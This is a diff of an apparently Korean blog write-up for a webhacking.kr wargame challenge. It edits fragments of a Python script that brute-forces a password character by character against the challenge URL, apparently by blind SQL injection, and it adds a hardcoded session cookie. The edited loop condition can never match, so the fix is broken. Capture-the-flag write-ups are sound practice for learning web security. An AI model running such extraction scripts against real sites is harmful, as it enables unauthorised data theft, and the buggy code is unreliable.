@@ -50,7 +50,7 @@ import string
 from time import sleep
 
 url = "http://webhacking.kr/challenge/web/web-10/"
-cookies = dict(PHPSESSID="")
+cookies = dict(PHPSESSID="1f70714d3b9c01e58b7a5c6c6c1a08f2")
 special_strings = "~!@#$%^&*()+-_{}[]<>"
 alpha = string.ascii_letters+string.digits+special_strings
 result = ""
@@ -80,7 +80,7 @@ for i in range(1, length):
                         result += a
                         break
 
-                if i == length-1:
+                if i == length:
                         print("\npassword is "+result)
                         print("\n")
 ```
@@ -93,8 +93,6 @@ max 데이터의 길이를 구하고, 길이를 구할 때 사용했던 쿼리�
 hex값과 똑같은 문자를 넣으면 거짓이 떴다.
 
 다른 분들의 풀이를 참고해도 설명이 다 달라서 헷갈린다..ㅎㅎ 이 부분은 더 공부를 해봐야 할 것 같다.
-
-위 코드는 결과값은 잘 나오는데 출력이 조금 이상해서 마지막 글자만 떨어져서 나온다.. 손 좀 봐야겠다.
 
 ![]({{ site.baseurl }}/assets/posts/webhackingkr/13_flag.png)
 
